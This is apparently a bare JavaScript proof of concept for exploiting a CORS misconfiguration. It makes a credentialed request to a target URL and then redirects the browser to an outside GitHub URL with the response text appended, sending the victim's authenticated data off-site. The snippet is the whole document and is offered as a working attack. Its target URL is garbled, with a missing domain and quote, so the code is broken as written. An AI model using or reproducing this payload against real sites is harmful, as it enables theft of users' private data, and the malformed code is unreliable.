var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get',https://.com/line/encrypt',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='https://github.com/zimshk/cors/blob/main/nice.js'+this.responseText; 
};
